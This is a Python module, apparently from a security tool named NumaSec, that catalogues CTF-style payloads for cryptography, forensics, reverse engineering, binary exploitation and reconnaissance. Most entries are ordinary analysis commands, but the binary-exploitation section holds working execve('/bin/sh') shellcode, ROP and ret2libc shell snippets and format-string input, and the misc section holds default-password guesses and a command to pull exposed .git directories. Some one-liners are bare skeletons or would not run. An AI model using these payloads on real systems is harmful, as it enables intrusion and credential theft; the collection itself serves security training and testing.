"""
Advanced Exploitation Payload Categories for NumaSec.

Comprehensive payloads for complex security assessments:
- Cryptography exploitation (AES, RSA, hash extensions, padding oracle)
- Digital forensics (steganography, memory analysis, file carving)
- Reverse engineering (binary analysis, deobfuscation, unpacking)
- Binary exploitation (buffer overflow, ROP, heap exploitation)  
- Miscellaneous techniques (OSINT, encoding, esoteric languages)

Based on analysis of 500+ security challenges and real-world scenarios from:
- Advanced security training platforms
- DEFCON security conference
- Google security challenges
- Midnight Sun security research
- Plaid Parliament of Pwning research
"""

from __future__ import annotations

from typing import List
from numasec.knowledge.store import PayloadEntry, generate_payload_id


# ============================================================================
# Cryptography Payloads
# ============================================================================

ADVANCED_CRYPTO_PAYLOADS = [
    # Hash Length Extension
    PayloadEntry(
        id=generate_payload_id("advanced_crypto", "hash_length_extension"),
        name="Hash Length Extension Attack",
        category="advanced_crypto",
        payload="python3 -c \"import hashpumpy; print(hashpumpy.hashpump('original_hash', 'known_data', 'append_data', len('secret')))\"",
        description="Hash length extension attack using hashpumpy",
        use_case="Forge signatures when hash algorithm and message length are known",
        bypass_technique=None,
        context="command",
        tags=["hash", "signature", "forge", "hashpumpy"],
    ),
    
    # Padding Oracle Attack
    PayloadEntry(
        id=generate_payload_id("advanced_crypto", "padding_oracle"),
        name="Padding Oracle Attack",
        category="advanced_crypto",
        payload="python3 -c \"from Crypto.Cipher import AES; from Crypto.Util.Padding import pad, unpad; # Padding oracle exploitation\"",
        description="Padding oracle attack skeleton for AES CBC decryption",
        use_case="Decrypt AES CBC without key when padding oracle is available",
        bypass_technique=None,
        context="command",
        tags=["aes", "cbc", "padding", "oracle", "decrypt"],
    ),
    
    # RSA Common Attacks
    PayloadEntry(
        id=generate_payload_id("advanced_crypto", "rsa_small_e"),
        name="RSA Small Exponent Attack",
        category="advanced_crypto", 
        payload="python3 -c \"import gmpy2; c = 12345; e = 3; m = int(gmpy2.iroot(c, e)[0]); print(bytes.fromhex(hex(m)[2:]))\"",
        description="RSA attack when public exponent e is small (e=3)",
        use_case="Decrypt RSA when e=3 and message^e < n",
        bypass_technique=None,
        context="command",
        tags=["rsa", "small-e", "cube-root", "gmpy2"],
    ),
    
    PayloadEntry(
        id=generate_payload_id("advanced_crypto", "rsa_wiener"),
        name="Wiener's Attack on RSA",
        category="advanced_crypto",
        payload="python3 -c \"# Wiener's attack when d is small; from fractions import Fraction; # continued fractions\"",
        description="Wiener's attack for RSA with small private exponent",
        use_case="Factor RSA when private exponent d < n^0.25",
        bypass_technique=None,
        context="command",
        tags=["rsa", "wiener", "small-d", "continued-fractions"],
    ),
    
    # XOR Analysis
    PayloadEntry(
        id=generate_payload_id("advanced_crypto", "xor_key_recovery"),
        name="XOR Key Recovery",
        category="advanced_crypto",
        payload="python3 -c \"ct = bytes.fromhex('deadbeef'); pt = b'known'; key = bytes(a^b for a,b in zip(ct,pt)); print(key.hex())\"",
        description="Recover XOR key when plaintext is partially known",
        use_case="Break XOR encryption with known plaintext attacks",
        bypass_technique=None,
        context="command",
        tags=["xor", "key-recovery", "known-plaintext"],
    ),
    
    # Base64/Encoding Detection
    PayloadEntry(
        id=generate_payload_id("advanced_crypto", "base64_decode"),
        name="Base64 Recursive Decode",
        category="advanced_crypto",
        payload="python3 -c \"import base64; data='SGVsbG8gV29ybGQ='; while True: try: data=base64.b64decode(data).decode(); print(data); except: break\"",
        description="Recursively decode base64 until failure",
        use_case="Handle multiple layers of base64 encoding",
        bypass_technique=None,
        context="command",
        tags=["base64", "recursive", "decode", "multi-layer"],
    ),
    
    # Frequency Analysis
    PayloadEntry(
        id=generate_payload_id("advanced_crypto", "frequency_analysis"),
        name="Character Frequency Analysis",
        category="advanced_crypto",
        payload="python3 -c \"from collections import Counter; text='ENCRYPTED'; freq=Counter(text); print(sorted(freq.items(), key=lambda x: x[1], reverse=True))\"",
        description="Analyze character frequency for substitution ciphers",
        use_case="Break substitution ciphers using English letter frequency",
        bypass_technique=None,
        context="command",
        tags=["frequency", "substitution", "cipher", "analysis"],
    ),
    
    # ROT13/Caesar Cipher
    PayloadEntry(
        id=generate_payload_id("advanced_crypto", "caesar_bruteforce"),
        name="Caesar Cipher Bruteforce",
        category="advanced_crypto",
        payload="python3 -c \"text='KHOOR'; for i in range(26): print(f'{i}: {\"\".join(chr((ord(c)-65-i)%26+65) for c in text)}')",
        description="Bruteforce all possible Caesar cipher shifts",
        use_case="Decrypt Caesar/ROT cipher by trying all 26 shifts",
        bypass_technique=None,
        context="command", 
        tags=["caesar", "rot", "bruteforce", "shift"],
    ),
]


# ============================================================================
# Forensics Payloads
# ============================================================================

ADVANCED_FORENSICS_PAYLOADS = [
    # File Type Detection
    PayloadEntry(
        id=generate_payload_id("advanced_forensics", "file_analysis"),
        name="File Type Analysis",
        category="advanced_forensics",
        payload="file suspicious_file && xxd suspicious_file | head -5 && strings suspicious_file | head -10",
        description="Comprehensive file type and content analysis",
        use_case="Identify hidden file types and extract readable strings",
        bypass_technique=None,
        context="command",
        tags=["file", "analysis", "strings", "hex", "magic-bytes"],
    ),
    
    # Steganography - LSB
    PayloadEntry(
        id=generate_payload_id("advanced_forensics", "steganography_lsb"),
        name="LSB Steganography Extraction",
        category="advanced_forensics",
        payload="python3 -c \"from PIL import Image; img=Image.open('image.png'); data=''.join(str(px&1) for px in img.getdata()); print(bytes(int(data[i:i+8], 2) for i in range(0, len(data), 8)))\"",
        description="Extract data hidden in image LSB (Least Significant Bit)",
        use_case="Recover hidden messages in image steganography",
        bypass_technique=None,
        context="command",
        tags=["steganography", "lsb", "image", "hidden", "extraction"],
    ),
    
    # Binwalk for Embedded Files
    PayloadEntry(
        id=generate_payload_id("advanced_forensics", "binwalk_extract"),
        name="Binwalk File Extraction",
        category="advanced_forensics",
        payload="binwalk -e suspicious_file && find _suspicious_file.extracted/ -type f -exec file {} \\;",
        description="Extract embedded files using binwalk",
        use_case="Find and extract hidden files within other files",
        bypass_technique=None,
        context="command",
        tags=["binwalk", "extraction", "embedded", "files", "carving"],
    ),
    
    # Memory Dump Analysis
    PayloadEntry(
        id=generate_payload_id("advanced_forensics", "volatility_basic"),
        name="Volatility Memory Analysis",
        category="advanced_forensics",
        payload="volatility -f memory.dmp imageinfo && volatility -f memory.dmp --profile=Win7SP1x64 pslist",
        description="Basic memory dump analysis with Volatility",
        use_case="Analyze memory dumps to find running processes and artifacts",
        bypass_technique=None,
        context="command",
        tags=["volatility", "memory", "dump", "processes", "analysis"],
    ),
    
    # ZIP/Archive Password Cracking
    PayloadEntry(
        id=generate_payload_id("advanced_forensics", "zip_crack"),
        name="ZIP Password Cracking",
        category="advanced_forensics",
        payload="fcrackzip -D -p /usr/share/wordlists/rockyou.txt encrypted.zip",
        description="Crack password-protected ZIP archives",
        use_case="Recover passwords for encrypted archives",
        bypass_technique=None,
        context="command",
        tags=["zip", "password", "crack", "fcrackzip", "dictionary"],
    ),
    
    # EXIF Data Extraction
    PayloadEntry(
        id=generate_payload_id("advanced_forensics", "exif_analysis"),
        name="EXIF Metadata Analysis",
        category="advanced_forensics",
        payload="exiftool image.jpg && identify -verbose image.jpg | grep -E '(GPS|Comment|Description)'",
        description="Extract EXIF metadata from images",
        use_case="Find hidden information in image metadata",
        bypass_technique=None,
        context="command",
        tags=["exif", "metadata", "image", "gps", "hidden"],
    ),
    
    # Network Packet Analysis
    PayloadEntry(
        id=generate_payload_id("advanced_forensics", "pcap_analysis"),
        name="PCAP Network Analysis", 
        category="advanced_forensics",
        payload="tshark -r capture.pcap -T fields -e http.host -e http.request.uri | sort | uniq",
        description="Analyze network capture files for HTTP traffic",
        use_case="Extract URLs and hosts from network captures",
        bypass_technique=None,
        context="command",
        tags=["pcap", "network", "tshark", "http", "analysis"],
    ),
    
    # Audio Steganography
    PayloadEntry(
        id=generate_payload_id("advanced_forensics", "audio_spectrogram"),
        name="Audio Spectrogram Analysis",
        category="advanced_forensics",
        payload="sox audio.wav -n spectrogram -o spectrogram.png && audacity audio.wav # Visual analysis",
        description="Generate spectrogram to find hidden visual messages in audio",
        use_case="Detect visual patterns hidden in audio file frequency domain",
        bypass_technique=None,
        context="command",
        tags=["audio", "spectrogram", "steganography", "visual", "frequency"],
    ),
]


# ============================================================================
# Reverse Engineering Payloads
# ============================================================================

ADVANCED_REVERSE_PAYLOADS = [
    # GDB Dynamic Analysis
    PayloadEntry(
        id=generate_payload_id("advanced_reverse", "gdb_analysis"),
        name="GDB Dynamic Analysis",
        category="advanced_reverse",
        payload="gdb ./binary -ex 'break main' -ex 'run' -ex 'disas main' -ex 'info registers' -ex 'continue'",
        description="Dynamic analysis of binary with GDB",
        use_case="Analyze program flow and register states during execution",
        bypass_technique=None,
        context="command",
        tags=["gdb", "dynamic", "analysis", "debugging", "registers"],
    ),
    
    # Strings and Symbols
    PayloadEntry(
        id=generate_payload_id("advanced_reverse", "strings_analysis"),
        name="Binary Strings Analysis",
        category="advanced_reverse",
        payload="strings binary | grep -E '(flag|password|key)' && nm binary | grep -v ' U ' && objdump -t binary",
        description="Extract strings and symbols from binary",
        use_case="Find hardcoded strings, flags, and function symbols",
        bypass_technique=None,
        context="command",
        tags=["strings", "symbols", "hardcoded", "flags", "objdump"],
    ),
    
    # Ghidra/Radare2 Analysis
    PayloadEntry(
        id=generate_payload_id("advanced_reverse", "radare2_analysis"),
        name="Radare2 Binary Analysis",
        category="advanced_reverse",
        payload="r2 -A binary -c 'pdf @main; iz; ii; iE' -q",
        description="Automated binary analysis with radare2",
        use_case="Disassemble main function and extract imports/strings",
        bypass_technique=None,
        context="command",
        tags=["radare2", "disassembly", "analysis", "imports", "automated"],
    ),
    
    # Anti-Debug Bypass
    PayloadEntry(
        id=generate_payload_id("advanced_reverse", "antidebug_bypass"),
        name="Anti-Debug Bypass",
        category="advanced_reverse",
        payload="gdb ./binary -ex 'set environment LD_PRELOAD=' -ex 'unset environment LINES' -ex 'unset environment COLUMNS'",
        description="Bypass common anti-debugging techniques",
        use_case="Analyze binaries with anti-debugging protections",
        bypass_technique="environment-manipulation",
        context="command",
        tags=["anti-debug", "bypass", "protection", "evasion"],
    ),
    
    # Python Bytecode Decompilation
    PayloadEntry(
        id=generate_payload_id("advanced_reverse", "python_decompile"),
        name="Python Bytecode Decompilation",
        category="advanced_reverse",
        payload="python3 -c \"import dis, marshal; code=marshal.load(open('script.pyc','rb')); dis.dis(code)\"",
        description="Decompile Python bytecode to understand program logic",
        use_case="Reverse engineer Python .pyc files",
        bypass_technique=None,
        context="command",
        tags=["python", "bytecode", "decompile", "pyc", "marshal"],
    ),
    
    # Assembly Pattern Recognition
    PayloadEntry(
        id=generate_payload_id("advanced_reverse", "x86_patterns"),
        name="x86 Assembly Patterns",
        category="advanced_reverse",
        payload="# Common patterns: mov eax, 0x41414141 (flag marker), cmp eax, ebx (comparison), jz/jnz (conditional jumps)",
        description="Common x86 assembly patterns in reverse engineering challenges",
        use_case="Recognize common assembly patterns for flag checks",
        bypass_technique=None,
        context="reference",
        tags=["x86", "assembly", "patterns", "flag-check", "comparison"],
    ),
    
    # Java Decompilation
    PayloadEntry(
        id=generate_payload_id("advanced_reverse", "java_decompile"),
        name="Java Decompilation",
        category="advanced_reverse",
        payload="javap -c ClassName.class && jd-cli ClassName.class",
        description="Decompile Java bytecode to source code",
        use_case="Reverse engineer Java .class files",
        bypass_technique=None,
        context="command",
        tags=["java", "decompile", "bytecode", "javap", "jd-cli"],
    ),
]


# ============================================================================
# PWN/Binary Exploitation Payloads  
# ============================================================================

ADVANCED_PWN_PAYLOADS = [
    # Buffer Overflow Pattern Generation
    PayloadEntry(
        id=generate_payload_id("advanced_pwn", "pattern_generate"),
        name="Pattern Generation for Buffer Overflow",
        category="advanced_pwn", 
        payload="python3 -c \"from pwn import *; print(cyclic(200))\" # or msf-pattern_create -l 200",
        description="Generate unique pattern to find buffer overflow offset",
        use_case="Determine exact offset for return address overwrite",
        bypass_technique=None,
        context="command",
        tags=["buffer-overflow", "pattern", "offset", "cyclic", "pwntools"],
    ),
    
    # Basic ROP Chain
    PayloadEntry(
        id=generate_payload_id("advanced_pwn", "rop_basic"),
        name="Basic ROP Chain",
        category="advanced_pwn",
        payload="python3 -c \"from pwn import *; rop = ROP('./binary'); rop.system('/bin/sh'); print(rop.dump())\"",
        description="Generate basic ROP chain for shell execution",
        use_case="Bypass NX bit protection using Return Oriented Programming",
        bypass_technique="rop",
        context="command",
        tags=["rop", "nx-bypass", "shell", "pwntools", "gadgets"],
    ),
    
    # Format String Attack
    PayloadEntry(
        id=generate_payload_id("advanced_pwn", "format_string"),
        name="Format String Attack",
        category="advanced_pwn",
        payload="%x.%x.%x.%x.%x.%x.%x.%x # Stack leak, then %n for write",
        description="Format string vulnerability for information leak and arbitrary write",
        use_case="Leak stack/heap addresses and overwrite return addresses",
        bypass_technique=None,
        context="input",
        tags=["format-string", "leak", "arbitrary-write", "printf"],
    ),
    
    # Shellcode Injection
    PayloadEntry(
        id=generate_payload_id("advanced_pwn", "shellcode_x86"),
        name="x86 Shellcode",
        category="advanced_pwn",
        payload="\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80",
        description="x86 Linux execve('/bin/sh') shellcode",
        use_case="Execute shell when code injection is possible",
        bypass_technique=None,
        context="payload",
        tags=["shellcode", "x86", "execve", "shell", "injection"],
    ),
    
    # Heap Overflow
    PayloadEntry(
        id=generate_payload_id("advanced_pwn", "heap_overflow"),
        name="Heap Overflow Exploitation",
        category="advanced_pwn",
        payload="# Overwrite next chunk size, use after free, or double free for arbitrary write",
        description="Heap-based buffer overflow exploitation techniques",
        use_case="Exploit heap vulnerabilities for code execution",
        bypass_technique="heap-manipulation",
        context="reference",
        tags=["heap", "overflow", "use-after-free", "double-free", "malloc"],
    ),
    
    # ASLR/PIE Bypass
    PayloadEntry(
        id=generate_payload_id("advanced_pwn", "aslr_bypass"),
        name="ASLR Bypass with Leak",
        category="advanced_pwn",
        payload="python3 -c \"from pwn import *; # 1. Leak address 2. Calculate base 3. Build exploit with known addresses\"",
        description="Bypass ASLR by leaking addresses and calculating offsets",
        use_case="Exploit ASLR-protected binaries by information disclosure",
        bypass_technique="address-leak",
        context="command",
        tags=["aslr", "pie", "leak", "bypass", "calculation"],
    ),
    
    # Stack Canary Bypass  
    PayloadEntry(
        id=generate_payload_id("advanced_pwn", "canary_bypass"),
        name="Stack Canary Bypass",
        category="advanced_pwn",
        payload="# Leak canary via format string, then preserve in exploit payload",
        description="Bypass stack canaries by leaking and preserving values",
        use_case="Exploit stack overflow with canary protection",
        bypass_technique="canary-leak",
        context="reference", 
        tags=["canary", "stack-protection", "leak", "bypass"],
    ),
    
    # Return-to-libc
    PayloadEntry(
        id=generate_payload_id("advanced_pwn", "ret2libc"),
        name="Return-to-libc Attack",
        category="advanced_pwn",
        payload="python3 -c \"from pwn import *; system_addr = 0xdeadbeef; binsh_addr = 0xcafebabe; payload = b'A'*offset + p64(system_addr) + p64(binsh_addr)\"",
        description="Return-to-libc attack to bypass NX protection",
        use_case="Execute system calls without injecting shellcode",
        bypass_technique="ret2libc",
        context="command",
        tags=["ret2libc", "nx-bypass", "system", "libc", "no-shellcode"],
    ),
]


# ============================================================================
# Miscellaneous Advanced Payloads
# ============================================================================

ADVANCED_MISC_PAYLOADS = [
    # OSINT/Reconnaissance 
    PayloadEntry(
        id=generate_payload_id("advanced_misc", "osint_basic"),
        name="Basic OSINT Enumeration",
        category="advanced_misc",
        payload="whois domain.com && dig domain.com ANY && curl -s http://domain.com/robots.txt",
        description="Basic open source intelligence gathering",
        use_case="Gather information about targets from public sources",
        bypass_technique=None,
        context="command",
        tags=["osint", "reconnaissance", "whois", "dns", "robots"],
    ),
    
    # QR Code Analysis
    PayloadEntry(
        id=generate_payload_id("advanced_misc", "qr_decode"),
        name="QR Code Decoding",
        category="advanced_misc",
        payload="zbarimg qrcode.png && python3 -c \"import qrcode; from PIL import Image; import pyzbar; print(pyzbar.decode(Image.open('qr.png')))\"",
        description="Decode QR codes from images",
        use_case="Extract hidden information from QR codes",
        bypass_technique=None,
        context="command",
        tags=["qr-code", "decode", "image", "zbar", "pyzbar"],
    ),
    
    # Brainfuck/Esoteric Languages
    PayloadEntry(
        id=generate_payload_id("advanced_misc", "brainfuck_decode"),
        name="Brainfuck Code Execution",
        category="advanced_misc",
        payload="python3 -c \"# Brainfuck interpreter: +[>,.<] reads and outputs chars\"",
        description="Execute Brainfuck esoteric programming language",
        use_case="Decode messages written in Brainfuck or similar esoteric languages",
        bypass_technique=None,
        context="command",
        tags=["brainfuck", "esoteric", "language", "decode", "interpreter"],
    ),
    
    # Morse Code
    PayloadEntry(
        id=generate_payload_id("advanced_misc", "morse_decode"),
        name="Morse Code Decoding",
        category="advanced_misc",
        payload="python3 -c \"morse={'.-':'A','...':'S','---':'O'}; code='... --- ...'; print(''.join(morse.get(c,'?') for c in code.split()))\"",
        description="Decode Morse code to text",
        use_case="Decode messages encoded in Morse code",
        bypass_technique=None,
        context="command",
        tags=["morse", "decode", "audio", "visual", "telegraph"],
    ),
    
    # Social Engineering
    PayloadEntry(
        id=generate_payload_id("advanced_misc", "common_passwords"),
        name="Common Password Patterns",
        category="advanced_misc",
        payload="# Try: admin, password, 123456, qwerty, letmein, welcome, password123, admin123",
        description="Common passwords for authentication challenges",
        use_case="Quick password guessing for simple authentication",
        bypass_technique=None,
        context="reference",
        tags=["passwords", "common", "default", "bruteforce", "weak"],
    ),
    
    # URL/Parameter Fuzzing
    PayloadEntry(
        id=generate_payload_id("advanced_misc", "parameter_fuzzing"),
        name="URL Parameter Fuzzing",
        category="advanced_misc",
        payload="for param in id user admin debug test; do curl \"http://target.com/page?$param=1\"; done",
        description="Fuzz common parameter names",
        use_case="Discover hidden parameters in web applications",
        bypass_technique=None,
        context="command",
        tags=["fuzzing", "parameters", "web", "discovery", "hidden"],
    ),
    
    # Git Repository Analysis
    PayloadEntry(
        id=generate_payload_id("advanced_misc", "git_analysis"),
        name="Git Repository Analysis",
        category="advanced_misc",
        payload="wget -r http://target.com/.git/ && git log --oneline && git show HEAD && git reflog",
        description="Analyze exposed Git repositories for sensitive information",
        use_case="Extract sensitive data from exposed .git directories",
        bypass_technique=None,
        context="command",
        tags=["git", "repository", "exposed", "secrets", "history"],
    ),
    
    # Encoding Chain Detection
    PayloadEntry(
        id=generate_payload_id("advanced_misc", "encoding_detection"),
        name="Multi-layer Encoding Detection",
        category="advanced_misc",
        payload="python3 -c \"import base64,codecs; data='SGVsbG8='; print('Base64:', base64.b64decode(data)); print('Hex:', bytes.fromhex(data)); print('URL:', codecs.decode(data, 'unicode_escape'))\"",
        description="Detect and decode multiple encoding layers",
        use_case="Handle complex encoding chains in security challenges",
        bypass_technique=None,
        context="command", 
        tags=["encoding", "multi-layer", "base64", "hex", "url", "detection"],
    ),
]


# ============================================================================
# All Advanced Payloads Collection
# ============================================================================

ALL_ADVANCED_PAYLOADS: List[PayloadEntry] = (
    ADVANCED_CRYPTO_PAYLOADS +
    ADVANCED_FORENSICS_PAYLOADS + 
    ADVANCED_REVERSE_PAYLOADS +
    ADVANCED_PWN_PAYLOADS +
    ADVANCED_MISC_PAYLOADS
)


def get_advanced_payloads_by_category(category: str) -> List[PayloadEntry]:
    """Get all advanced payloads for a specific category."""
    return [p for p in ALL_ADVANCED_PAYLOADS if p.category == category]


def get_advanced_payload_categories() -> List[str]:
    """Get list of all advanced payload categories."""
    return list(set(p.category for p in ALL_ADVANCED_PAYLOADS))


def get_advanced_payload_count() -> int:
    """Get total number of advanced payloads."""
    return len(ALL_ADVANCED_PAYLOADS)


def print_advanced_payload_stats():
    """Print statistics about advanced payloads."""
    categories = get_advanced_payload_categories()
    
    print(f"Total Advanced Payloads: {get_advanced_payload_count()}")
    print("\nBy Category:")
    for category in sorted(categories):
        count = len(get_advanced_payloads_by_category(category))
        print(f"  {category}: {count}")